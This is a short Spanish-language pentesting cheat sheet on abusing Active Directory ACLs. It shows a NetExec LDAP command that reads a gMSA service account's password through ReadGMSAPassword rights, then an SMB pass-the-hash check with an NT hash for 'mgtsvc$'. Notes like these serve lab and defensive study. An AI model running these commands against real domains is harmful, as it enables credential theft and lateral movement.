# Abuso ACL

Tags: #AD #ACL #Linux 

## ReadGMSAPassword sobre un Usuario$

```bash 
# Si pertenecemos al grupo con los privilegios 'ReadGMSAPassword' se puede leer la password del usuario 

❯ nxc ldap IP_DC -u user -p 'P@$$w0rd123!' --gmsa 

Donde:
	- Puede que el usuario se represente de la siguiente manera 'user$' que significa que es un gMSA (Group Managed Service Account)
	- Es unaa cuenta de AD de servicio destinada a ejecutar servicios/aplicaciones 
	- El sistema administra automáticamente su contraseña, incluyendo su rotación periódica
```

```bash 
# Verificar el hash 
❯ nxc smb IP_DC -u 'mgtsvc$' -H e0915507b35c02ccc57959c4a1fc6051
```
